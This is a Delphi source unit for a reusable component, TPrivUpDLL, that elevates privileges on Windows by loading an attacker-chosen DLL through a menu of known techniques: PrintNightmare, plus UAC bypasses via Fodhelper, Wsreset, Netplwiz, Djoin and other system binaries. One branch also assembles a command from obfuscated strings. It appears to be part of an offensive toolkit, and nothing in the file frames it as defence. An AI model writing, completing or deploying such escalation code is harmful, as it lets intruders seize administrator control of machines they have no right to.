unit PrivUpDLL;

interface

uses GetLibModHandleDLL, CodeUnitDLL, System.Classes;

type
  TMethodEx = ( GPEDIT, PrintNightmare, PRINTUI, Netplwiz, Fsquirt, Wsreset,
  Djoin, OptionalFeatures, Fodhelper, SystemPropertiesAdvanced );
  TPrivUpDLL = class(TComponent)

private
  FCommand: String;
  FMethod: TMethodEx;
  procedure SetMethod(Value: TMethodEx);
  function GetMethod: TMethodEx;
protected
public
  constructor Create(AOwner: TComponent); override;
  destructor Destroy; override;
  procedure Execute;

published
  property DllName: string read FCommand write FCommand;
  property Method: TMethodEx read GetMethod write SetMethod;

end;

procedure Register;

implementation

constructor TPrivUpDLL.Create(AOwner:TComponent);
begin
  inherited Create(AOwner);
end;

destructor TPrivUpDLL.Destroy;
begin
  inherited;
end;

function TPrivUpDLL.GetMethod: TMethodEx;
begin
  Result := FMethod;
end;

procedure TPrivUpDLL.SetMethod(Value: TMethodEx);
begin
  FMethod := Value;
end;

procedure TPrivUpDLL.Execute;
var
  WT: LongBool;
begin
  if FMethod = GPEDIT then
  begin
    WoW1(WT);
    SEW($00, '',
      PChar(string(HATS(HCOM))),
      PChar(string(HATS(HCOM1))+FCommand+string(HATS(HCOM2))+string(HATS(HCOM3))+
      string(HATS(HCOM4))+FCommand+string(HATS(HCOM5))+string(HATS(HCOM6))+string(HATS(HCOM64))),
      '', $00);
    WoW2(WT);
  end
  else if FMethod = PrintNightmare then
  begin
    WoW1(WT);
    LoadDLLUpPN(FCommand);
    WoW2(WT);
  end
  else if FMethod = PRINTUI then
  begin
    WoW1(WT);
    LoadDLLUpPU(FCommand);
    WoW2(WT);
  end
  else if FMethod = Netplwiz then
  begin
    WoW1(WT);
    LoadDLLUpNW(FCommand);
    WoW2(WT);
  end
  else if FMethod = Fsquirt then
  begin
    WoW1(WT);
    LoadDLLUpFQ(FCommand);
    WoW2(WT);
  end
  else if FMethod = Wsreset then
  begin
    WoW1(WT);
    LoadDLLUpWSR(FCommand);
    WoW2(WT);
  end
  else if FMethod = Djoin then
  begin
    WoW1(WT);
    LoadDLLUpDJ(FCommand);
    WoW2(WT);
  end
  else if FMethod = OptionalFeatures then
  begin
    WoW1(WT);
    LoadDLLUpOF(FCommand);
    WoW2(WT);
  end
  else if FMethod = Fodhelper then
  begin
    WoW1(WT);
    LoadDLLUpFH(FCommand);
    WoW2(WT);
  end
  else if FMethod = SystemPropertiesAdvanced then
  begin
    WoW1(WT);
    LoadDLLUpSPA(FCommand);
    WoW2(WT);
  end;
end;

procedure Register;
begin
  RegisterComponents('ZERO COM', [TPrivUpDLL]);
end;

end.